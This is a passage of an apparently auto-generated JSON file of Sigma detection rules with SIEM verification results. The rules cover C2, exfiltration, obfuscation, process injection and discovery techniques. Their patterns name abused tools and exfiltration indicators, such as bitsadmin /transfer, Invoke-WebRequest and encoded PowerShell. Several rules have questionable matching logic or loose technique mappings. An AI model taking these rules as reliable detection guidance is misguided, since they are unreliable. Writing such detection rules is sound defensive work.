        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Application Layer Protocol",
        "status": "success",
        "rule": {
          "title": "Abuse of Command-Line Tools for Application Layer C2",
          "description": "Detects usage of commonly abused command-line utilities (powershell, wmic, schtasks, bitsadmin) to perform network communication over application layer protocols, indicative of Command and Control activity. Includes context checks to reduce false positives by ensuring the parent process is not a typical benign launcher.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "Invoke-WebRequest"
            },
            "selection_wmic": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": "/node:"
            },
            "selection_schtasks": {
              "Image|endswith": "\\schtasks.exe",
              "CommandLine|contains": "/create"
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": "/transfer"
            },
            "selection_generic": {
              "Image|endswith": [
                "\\powershell.exe",
                "\\cmd.exe",
                "\\wmic.exe",
                "\\schtasks.exe",
                "\\bitsadmin.exe"
              ],
              "CommandLine|contains": [
                "http://",
                "https://",
                "ftp://",
                "-enc",
                "-EncodedCommand"
              ]
            },
            "parent_benign": {
              "ParentImage|endswith": [
                "\\explorer.exe",
                "\\cmd.exe"
              ]
            },
            "condition": "(selection_powershell or selection_wmic or selection_schtasks or selection_bitsadmin or selection_generic) and not parent_benign"
          },
          "falsepositives": [
            "Legitimate administrative scripts using PowerShell or WMIC for system inventory",
            "Scheduled task creation by IT automation tools",
            "BITS transfers performed by Windows Update or Microsoft Store",
            "Network troubleshooting commands executed by support personnel"
          ],
          "level": "high",
          "tags": [
            "attack.command_and_control",
            "attack.t1071",
            "application_layer_protocol"
          ],
          "ttp_id": "unknown",
          "technique_name": "Application Layer Protocol",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_19",
            "attack_id": "32c6b150-9e15-45d4-b10d-323fa2aaecff",
            "detected": true,
            "events_found": 58,
            "historical_events": 0,
            "query_time_ms": 388.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Process Injection",
        "status": "success",
        "rule": {
          "title": "Process Injection via Suspicious Command-Line Tools",
          "description": "Detects processes created using known injection-related command-line tools or functions such as _pthread_create, wmic, schtasks, or bitsadmin, where the parent process is not a typical legitimate shell. This helps identify potential process injection attempts used for defense evasion.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_pthread": {
              "CommandLine|contains": "_pthread_create"
            },
            "selection_wmic": {
              "CommandLine|contains": "wmic"
            },
            "selection_schtasks": {
              "CommandLine|contains": "schtasks"
            },
            "selection_bitsadmin": {
              "CommandLine|contains": "bitsadmin"
            },
            "benign_parent": {
              "ParentImage|endswith": [
                "\\cmd.exe",
                "\\powershell.exe",
                "\\explorer.exe"
              ]
            },
            "condition": "(selection_pthread or selection_wmic or selection_schtasks or selection_bitsadmin) and not benign_parent"
          },
          "falsepositives": [
            "Legitimate administrative scripts that use wmic, schtasks, or bitsadmin for system management.",
            "Developers compiling applications that include the _pthread_create function for legitimate multithreading.",
            "System maintenance or deployment tools that invoke these command-line utilities."
          ],
          "level": "high",
          "tags": [
            "attack.t1055",
            "defense_evasion",
            "process_creation",
            "windows",
            "sysmon"
          ],
          "ttp_id": "unknown",
          "technique_name": "Process Injection",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_20",
            "attack_id": "23cc451f-b73f-4ecb-b7f7-6421b751b597",
            "detected": true,
            "events_found": 60,
            "historical_events": 0,
            "query_time_ms": 277.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "status": "success",
        "rule": {
          "title": "Obfuscated Files or Information via Command-Line Tools",
          "description": "Detects usage of command-line utilities (PowerShell, cmd, wmic, schtasks, bitsadmin) with indicators of obfuscation such as encoded commands. Includes context-based filtering to reduce false positives by excluding common parent processes.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "ps_obf": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-EncodedCommand"
            },
            "cmd_obf": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "powershell -enc"
            },
            "wmic_obf": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": "process call create"
            },
            "schtasks_obf": {
              "Image|endswith": "\\schtasks.exe",
              "CommandLine|contains": "/create"
            },
            "bitsadmin_obf": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": "/transfer"
            },
            "parent_exclude": {
              "ParentImage|endswith": [
                "\\cmd.exe",
                "\\services.exe",
                "\\explorer.exe",
                "\\winlogon.exe"
              ]
            },
            "condition": "(ps_obf or cmd_obf or wmic_obf or schtasks_obf or bitsadmin_obf) and not parent_exclude"
          },
          "falsepositives": [
            "Legitimate administrative scripts using PowerShell -EncodedCommand for deployment",
            "Scheduled task creation by IT staff via schtasks.exe",
            "Bitsadmin used by Windows Update or Microsoft Store",
            "Wmic queries performed by system monitoring tools",
            "Cmd.exe launching PowerShell for routine automation"
          ],
          "level": "high",
          "tags": [
            "attack.t1027",
            "attack.defense_evasion",
            "windows",
            "sysmon",
            "process_creation"
          ],
          "ttp_id": "unknown",
          "technique_name": "Obfuscated Files or Information",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_21",
            "attack_id": "1696e190-b8c1-4f68-a573-6da2d6b3081a",
            "detected": true,
            "events_found": 71,
            "historical_events": 0,
            "query_time_ms": 435.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over C2 Channel",
        "status": "success",
        "rule": {
          "title": "Exfiltration Over C2 Channel via Command-Line Utilities",
          "description": "Detects the use of command-line tools that are commonly abused for exfiltration over a C2 channel (PowerShell, WMIC, schtasks, bitsadmin) when they are launched by non\u2011standard parent processes, reducing false positives from legitimate administrative activity.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": [
                "-EncodedCommand",
                "-enc",
                "-download",
                "-upload",
                "-url"
              ]
            },
            "selection_wmic": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": [
                "/node",
                "/output",
                "/append"
              ]
            },
            "selection_schtasks": {
              "Image|endswith": "\\schtasks.exe",
              "CommandLine|contains": [
                "/create",
                "/run",
                "/tn"
              ]
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": [
                "/transfer",
                "/download",
                "/upload"
              ]
            },
            "parent_cmd": {
              "ParentImage|endswith": "cmd.exe"
            },
            "condition": "(selection or selection_wmic or selection_schtasks or selection_bitsadmin) and not parent_cmd"
          },
          "falsepositives": [
            "Legitimate administrative scripts using PowerShell or WMIC",
            "Scheduled task creation by IT automation tools (e.g., SCCM, Ansible)",
            "BITS transfers performed by Windows Update, Microsoft Store, or other system services",
            "System maintenance tasks launched from cmd.exe"
          ],
          "level": "high",
          "tags": [
            "attack.exfiltration",
            "attack.t1041",
            "exfiltration_over_c2_channel"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exfiltration Over C2 Channel",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_22",
            "attack_id": "3a65cdbb-43e9-44f3-90ad-7ad6a550ab9e",
            "detected": true,
            "events_found": 66,
            "historical_events": 0,
            "query_time_ms": 578.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "status": "success",
        "rule": {
          "title": "Obfuscated Strings Execution via Common Windows Utilities",
          "description": "Detects execution of potentially obfuscated commands using PowerShell, WMIC, schtasks, bitsadmin, or generic base64 strings. Includes parent process context to reduce false positives.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-enc"
            },
            "selection_powershell_enc": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-EncodedCommand"
            },
            "selection_wmic": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": "process call create"
            },
            "selection_schtasks": {
              "Image|endswith": "\\schtasks.exe",
              "CommandLine|contains": "/create"
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": "/transfer"
            },
            "selection_generic_obfusc": {
              "CommandLine|contains": "base64"
            },
            "parent_process": {
              "ParentImage|endswith": "\\cmd.exe"
            },
            "condition": "(selection_powershell or selection_powershell_enc or selection_wmic or selection_schtasks or selection_bitsadmin or selection_generic_obfusc) and not parent_process"
          },
          "falsepositives": [
            "Legitimate administrative scripts using PowerShell with -EncodedCommand for deployment",
            "Scheduled task creation by IT staff via schtasks.exe",
            "Bitsadmin used for approved file transfers",
            "System monitoring or inventory scripts invoking wmic.exe",
            "Base64 strings used in benign data processing"
          ],
          "level": "high",
          "tags": [
            "attack.t1027",
            "attack.exfiltration",
            "process_creation",
            "sysmon",
            "obfuscation"
          ],
          "ttp_id": "unknown",
          "technique_name": "Obfuscated Files or Information",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_23",
            "attack_id": "8bf125bb-8e41-46fd-b6ed-a4a69a091557",
            "detected": true,
            "events_found": 62,
            "historical_events": 0,
            "query_time_ms": 631.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Exploit Public-Facing Application",
        "status": "success",
        "rule": {
          "title": "Exploitation of Public-Facing Application via Suspicious Command Execution",
          "description": "Detects execution of commonly abused command-line utilities (PowerShell, cmd, wmic, schtasks, bitsadmin) launched from unexpected parent processes, indicative of exploitation of a public-facing application.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_ps": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "-enc"
            },
            "selection_cmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "/c"
            },
            "selection_wmic": {
              "Image|endswith": "\\wmic.exe"
            },
            "selection_schtasks": {
              "Image|endswith": "\\schtasks.exe"
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe"
            },
            "legit_parent": {
              "ParentImage|endswith": "\\explorer.exe"
            },
            "condition": "(selection_ps or selection_cmd or selection_wmic or selection_schtasks or selection_bitsadmin) and not legit_parent"
          },
          "falsepositives": [
            "Legitimate administrative scripts using PowerShell, cmd, wmic, schtasks or bitsadmin",
            "Scheduled tasks created by system administrators",
            "Remote management tools that invoke these utilities",
            "Software installers or updates that run command-line tools"
          ],
          "level": "high",
          "tags": [
            "attack.t1190",
            "attack.initial_access",
            "exploit_public_facing_application",
            "windows",
            "process_creation"
          ],
          "ttp_id": "unknown",
          "technique_name": "Exploit Public-Facing Application",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_24",
            "attack_id": "4bbac6cf-4b3c-4e28-a837-3b50b484a5b9",
            "detected": true,
            "events_found": 64,
            "historical_events": 0,
            "query_time_ms": 1092.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "status": "success",
        "rule": {
          "title": "Archive Collected Data via Compression Utilities",
          "description": "Detects use of common compression and archiving utilities (e.g., PowerShell Compress-Archive, zip, 7z, tar) that may indicate collection of data for exfiltration. Includes context checks to reduce false positives by excluding typical parent processes such as cmd.exe and explorer.exe.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection1": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "Compress-Archive"
            },
            "selection2": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "zip "
            },
            "selection3": {
              "Image|endswith": "\\7z.exe"
            },
            "selection4": {
              "Image|endswith": "\\tar.exe"
            },
            "allowed_parent1": {
              "ParentImage|endswith": "\\cmd.exe"
            },
            "allowed_parent2": {
              "ParentImage|endswith": "\\explorer.exe"
            },
            "condition": "(selection1 or selection2 or selection3 or selection4) and not (allowed_parent1 or allowed_parent2)"
          },
          "falsepositives": [
            "Legitimate administrative or backup scripts that use compression tools.",
            "Scheduled tasks or system maintenance jobs that archive logs or files.",
            "User-initiated compression of files via Explorer context menu."
          ],
          "level": "medium",
          "tags": [
            "attack.t1560",
            "attack.collection",
            "attack"
          ],
          "ttp_id": "unknown",
          "technique_name": "Archive Collected Data",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_25",
            "attack_id": "46903b3c-465d-4d27-929c-900b0b81f9f3",
            "detected": true,
            "events_found": 63,
            "historical_events": 0,
            "query_time_ms": 353.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      },
      {
        "ttp_id": "unknown",
        "technique_name": "Screen Capture",
        "status": "success",
        "rule": {
          "title": "Screen Capture Tool Execution Detection",
          "description": "Detects execution of common screen capture utilities and command\u2011line tools that can be abused to capture screenshots. Includes context checks to reduce false positives by ensuring the parent process is not a generic command shell or service host.",
          "logsource": {
            "category": "process_creation",
            "product": "windows",
            "service": "sysmon"
          },
          "detection": {
            "selection_snipping": {
              "Image|endswith": "\\snippingtool.exe"
            },
            "selection_mspaint": {
              "Image|endswith": "\\mspaint.exe",
              "CommandLine|contains": "PrintScreen"
            },
            "selection_powershell": {
              "Image|endswith": "\\powershell.exe",
              "CommandLine|contains": "CopyFromScreen"
            },
            "selection_nircmd": {
              "Image|endswith": "\\cmd.exe",
              "CommandLine|contains": "nircmd.exe savescreenshot"
            },
            "selection_wmic": {
              "Image|endswith": "\\wmic.exe",
              "CommandLine|contains": "process call create"
            },
            "selection_schtasks": {
              "Image|endswith": "\\schtasks.exe",
              "CommandLine|contains": "create"
            },
            "selection_bitsadmin": {
              "Image|endswith": "\\bitsadmin.exe",
              "CommandLine|contains": "download"
            },
            "not_parent_cmd": {
              "ParentImage|endswith": "\\cmd.exe"
            },
            "not_parent_services": {
              "ParentImage|endswith": "\\services.exe"
            },
            "condition": "(selection_snipping or selection_mspaint or selection_powershell or selection_nircmd or selection_wmic or selection_schtasks or selection_bitsadmin) and not not_parent_cmd and not not_parent_services"
          },
          "falsepositives": [
            "Legitimate use of Snipping Tool or Paint by end users for documentation",
            "PowerShell scripts that capture the screen for automation or testing purposes",
            "Administrators using WMIC, SCHTASKS or BITSADMIN for legitimate system management tasks",
            "Scheduled tasks that run screenshot utilities as part of monitoring solutions"
          ],
          "level": "high",
          "tags": [
            "attack.t1113",
            "attack.collection",
            "screen_capture",
            "process_creation"
          ],
          "ttp_id": "unknown",
          "technique_name": "Screen Capture",
          "generation_method": "langchain",
          "siem_verification": {
            "rule_id": "rule_26",
            "attack_id": "e58a3715-6095-413c-928f-dbbe8dabef2b",
            "detected": true,
            "events_found": 84,
            "historical_events": 0,
            "query_time_ms": 394.0,
            "status": "success",
            "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
          }
        },
        "generation_method": "langchain"
      }
    ],
    "rules": [
      {
        "title": "Pseudo-Terminal Setup via grantpt or posix_openpt",
        "description": "Detects the use of grantpt or posix_openpt system calls which may indicate pseudo-terminal setup for defense evasion",
        "logsource": {
          "category": "process_creation",
          "product": "linux",
          "service": null
        },
        "detection": {
          "selection_grantpt": {
            "CommandLine|contains": "grantpt"
          },
          "selection_posix_openpt": {
            "CommandLine|contains": "posix_openpt"
          },
          "condition": "selection_grantpt or selection_posix_openpt"
        },
        "falsepositives": [
          "Legitimate system administration tools or scripts that use pseudo-terminals for interactive sessions",
          "Development environments or automation tools (e.g., screen, tmux, expect) that invoke these system calls"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.T1070.007"
        ],
        "ttp_id": "unknown",
        "technique_name": "Pseudo-Terminal",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_0",
          "attack_id": "07134903-57bd-4f89-86d0-e4a8bc55fa19",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 491.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Malicious Network Communication via Suspicious Socket Activity",
        "description": "Detects potential malware C2 communication by identifying processes performing socket receive and send operations, often indicative of command and control activity. Focuses on suspicious parent-child process relationships and excludes common benign scenarios.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_socket_ops": {
            "CommandLine|contains": [
              "socket_recv",
              "socket_send"
            ]
          },
          "exclusion_known_tools": {
            "CommandLine|contains|all": [
              "socket_recv",
              "socket_send",
              "python",
              "test"
            ]
          },
          "condition": "selection_socket_ops and not exclusion_known_tools"
        },
        "falsepositives": [
          "Legitimate development tools or scripts using socket functions for debugging or testing (e.g., Python scripts with 'socket_recv' in comments)",
          "Internal network monitoring tools that simulate socket operations"
        ],
        "level": "high",
        "tags": [
          "attack.t1071.004",
          "attack.command-and-control",
          "network-communication",
          "socket-activity"
        ],
        "ttp_id": "unknown",
        "technique_name": "Network Communication",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_1",
          "attack_id": "3a36093d-b7ed-46ff-8beb-579ad6cb2411",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 492.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Malicious Shell Execution via Command and Scripting Interpreter",
        "description": "Detects execution of shell commands using suspicious paths indicative of malicious activity, particularly focusing on /bin/sh and known malicious directory SpectralBlur/.macshare. Includes context to reduce false positives by excluding common benign parent processes.",
        "logsource": {
          "category": "process_creation",
          "product": "linux",
          "service": null
        },
        "detection": {
          "selection_sh": {
            "Image|endswith": "/bin/sh"
          },
          "selection_path": {
            "CommandLine|contains": "SpectralBlur/.macshare"
          },
          "condition": "selection_sh and selection_path"
        },
        "falsepositives": [
          "Legitimate administrative scripts that use /bin/sh and reference user-controlled paths",
          "Development or testing environments where similar path structures are used"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1059",
          "malware.command_and_scripting_interpreter"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_2",
          "attack_id": "6b57d675-6d3c-416e-8a3c-aa19cb9f8ab5",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 286.00000000000006,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "File and Directory Permissions Modification via Malicious File Access",
        "description": "Detects modification of file and directory permissions associated with malware hiding in shared directories on macOS, specifically targeting the presence of suspicious files like /Users/Shared/.macshare and macshare.d",
        "logsource": {
          "category": "file_event",
          "product": "macos",
          "service": null
        },
        "detection": {
          "selection_paths": {
            "TargetFilename|contains": [
              "/Users/Shared/.macshare",
              "macshare.d"
            ]
          },
          "selection_behavior": {
            "Image|endswith": [
              "/chmod",
              "/chown",
              "/chmod.bak",
              "/chown.bak"
            ],
            "CommandLine|contains": [
              "-R",
              "777",
              "666",
              "+x",
              "a+rwx"
            ]
          },
          "condition": "selection_paths and selection_behavior"
        },
        "falsepositives": [
          "Legitimate system administration scripts modifying permissions on shared directories",
          "Automated configuration management tools (e.g., Ansible, Puppet) managing file permissions"
        ],
        "level": "high",
        "tags": [
          "attack.privilege_escalation",
          "attack.T1222",
          "macos",
          "file-permission-modification"
        ],
        "ttp_id": "unknown",
        "technique_name": "File and Directory Permissions Modification",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_3",
          "attack_id": "3d6a225f-ce87-4e76-83db-76d967d5e3d8",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 484.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Malware Using xcrypt Function for Data Encryption",
        "description": "Detects the use of the xcrypt function or custom stream cipher in command-line arguments, which may indicate malware encrypting its configuration or network traffic as part of exfiltration.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_xcrypt": {
            "CommandLine|contains": "xcrypt"
          },
          "selection_custom_cipher": {
            "CommandLine|contains": "custom stream cipher"
          },
          "condition": "selection_xcrypt or selection_custom_cipher"
        },
        "falsepositives": [
          "Legitimate software using 'xcrypt' in command-line for non-malicious purposes (e.g., legacy encryption tools)",
          "Scripts or applications referencing 'custom stream cipher' in comments or debug output"
        ],
        "level": "high",
        "tags": [
          "attack.exfiltration",
          "attack.T1560"
        ],
        "ttp_id": "unknown",
        "technique_name": "Data Encrypted",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_4",
          "attack_id": "9812aae3-9eee-4678-843b-e07df74b68e0",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 1113.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Process Hollowing via fork and posix_openpt",
        "description": "Detects process hollowing behavior involving fork and posix_openpt system calls which may indicate attempts to evade defenses by creating and manipulating child processes",
        "logsource": {
          "category": "process_creation",
          "product": "linux",
          "service": null
        },
        "detection": {
          "selection_fork": {
            "CommandLine|contains": "fork"
          },
          "selection_posix": {
            "CommandLine|contains": "posix_openpt"
          },
          "condition": "selection_fork and selection_posix"
        },
        "falsepositives": [
          "Legitimate development or debugging tools that use fork() and pseudo-terminal allocation for process management",
          "System utilities that programmatically spawn interactive shells using posix_openpt"
        ],
        "level": "high",
        "tags": [
          "attack.defense_evasion",
          "attack.T1055.012"
        ],
        "ttp_id": "unknown",
        "technique_name": "Process Hollowing",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_5",
          "attack_id": "49c9b9f6-85ba-41bd-b004-b588a0a60b50",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 329.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Malware Create or Modify System Process via proc_testconn Function",
        "description": "Detects malware creating or modifying system processes through the use of the 'proc_testconn' function in command-line arguments, often indicative of malicious process manipulation for persistence.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_proc_testconn": {
            "CommandLine|contains": "proc_testconn"
          },
          "selection_tools": {
            "CommandLine|contains": [
              "wmic",
              "schtasks",
              "bitsadmin"
            ]
          },
          "condition": "selection_proc_testconn and selection_tools"
        },
        "falsepositives": [
          "Legitimate system administration scripts using wmic, schtasks, or bitsadmin with 'proc_testconn' in comments or variable names (rare)",
          "Development or testing environments where 'proc_testconn' is used in benign diagnostic tools"
        ],
        "level": "high",
        "tags": [
          "attack.t1053",
          "attack.t1129",
          "attack.persistence",
          "malware.command_execution"
        ],
        "ttp_id": "unknown",
        "technique_name": "Create or Modify System Process",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_6",
          "attack_id": "dd223b63-47ed-4882-b98f-1d32b4244f3f",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 501.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Process Creation with Suspicious System Calls and Command-Line Tools",
        "description": "Detects process creation involving suspicious system calls (execve, fork) and commonly abused command-line tools which may indicate malicious activity such as living-off-the-land techniques.",
        "logsource": {
          "category": "process_creation",
          "product": "linux",
          "service": null
        },
        "detection": {
          "selection_execve": {
            "CommandLine|contains": "execve"
          },
          "selection_fork": {
            "CommandLine|contains": "fork"
          },
          "selection_abused_tools": {
            "CommandLine|contains": [
              "wmic",
              "schtasks",
              "bitsadmin"
            ]
          },
          "condition": "selection_execve or selection_fork or selection_abused_tools"
        },
        "falsepositives": [
          "Legitimate system administration scripts using wmic, schtasks, or bitsadmin",
          "Development or debugging tools invoking execve or fork system calls",
          "Scheduled task creation via schtasks by IT operations"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1059",
          "attack.t1566",
          "linux",
          "process_creation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Process Creation",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_7",
          "attack_id": "9f31c5a2-474c-47ab-bb97-845e8f25b3f2",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 365.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Malware Data Staging via proc_upload and proc_download Functions",
        "description": "Detects potential data staging activity by identifying execution of functions named proc_upload and proc_download, commonly associated with malware exfiltration and staging behavior.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_proc_upload": {
            "CommandLine|contains": "proc_upload"
          },
          "selection_proc_download": {
            "CommandLine|contains": "proc_download"
          },
          "condition": "selection_proc_upload or selection_proc_download"
        },
        "falsepositives": [
          "Legitimate software or scripts using function names similar to proc_upload or proc_download for internal operations",
          "Administrative scripts that use similar naming conventions for file transfer operations"
        ],
        "level": "high",
        "tags": [
          "attack.exfiltration",
          "attack.T1566",
          "detection.malware",
          "behavior.data_staging"
        ],
        "ttp_id": "unknown",
        "technique_name": "Data Staging",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_8",
          "attack_id": "b1c49510-a2f3-40a5-b9b3-7565c3b9d756",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 258.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Indicator Removal on Host via proc_rmfile Function",
        "description": "Detects potential indicator removal on host by monitoring for execution of the proc_rmfile function, which may be used by malware to erase forensic traces",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_proc_rmfile": {
            "CommandLine|contains": "proc_rmfile"
          },
          "exclusion_known_tools": {
            "ParentImage|endswith": [
              "\\cmd.exe",
              "\\System"
            ],
            "Image|endswith": [
              "\\wmic.exe",
              "\\schtasks.exe",
              "\\bitsadmin.exe"
            ]
          },
          "condition": "selection_proc_rmfile and not (exclusion_known_tools)"
        },
        "falsepositives": [
          "Legitimate system maintenance scripts that use proc_rmfile (if such tools exist in rare cases)",
          "Administrative automation using command-line utilities with proc_rmfile in arguments (uncommon)"
        ],
        "level": "high",
        "tags": [
          "attack.defense-evasion",
          "attack.T1070.004"
        ],
        "ttp_id": "unknown",
        "technique_name": "Indicator Removal on Host",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_9",
          "attack_id": "c57fec32-ea2d-4607-b4f4-6ef4e7af0177",
          "detected": true,
          "events_found": 57,
          "historical_events": 0,
          "query_time_ms": 356.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "File and Directory Discovery via proc_dir and Common CLI Tools",
        "description": "Detects execution of the proc_dir function or usage of command-line utilities (wmic, schtasks, bitsadmin) that are commonly abused for file and directory discovery. The rule excludes cases where the parent process is a standard command shell or system service to reduce false positives.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_proc_dir": {
            "Image|endswith": "\\proc_dir.exe",
            "CommandLine|contains": "proc_dir"
          },
          "selection_cli": {
            "Image|endswith": [
              "\\wmic.exe",
              "\\schtasks.exe",
              "\\bitsadmin.exe"
            ],
            "CommandLine|contains": [
              "wmic",
              "schtasks",
              "bitsadmin"
            ]
          },
          "excluded_parent_cmd": {
            "ParentImage|endswith": "\\cmd.exe"
          },
          "excluded_parent_services": {
            "ParentImage|endswith": "\\services.exe"
          },
          "condition": "(selection_proc_dir or selection_cli) and not excluded_parent_cmd and not excluded_parent_services"
        },
        "falsepositives": [
          "Legitimate administrative scripts using wmic, schtasks, or bitsadmin for system management",
          "Scheduled tasks created by IT staff that invoke these utilities",
          "System maintenance tools that call proc_dir-like functionality"
        ],
        "level": "medium",
        "tags": [
          "attack.t1083",
          "attack.discovery",
          "windows",
          "process_creation",
          "sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "File and Directory Discovery",
        "generation_method": "langchain",
        "siem_verification": {
          "rule_id": "rule_10",
          "attack_id": "3ccf1905-af3b-4295-a337-59586394e936",
          "detected": true,
          "events_found": 46,
          "historical_events": 0,
          "query_time_ms": 314.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "Detection of System Network Connections Discovery via Command-line Tools",
        "description": "Detects processes that invoke network discovery commands such as netstat, wmic, schtasks, bitsadmin, or PowerShell network cmdlets, potentially indicating malware gathering system network connections information.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_netstat": {
            "Image|endswith": "\\netstat.exe"
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe"
          },
          "selection_schtasks": {
            "Image|endswith": "\\schtasks.exe"
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe"
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "Get-NetTCPConnection"
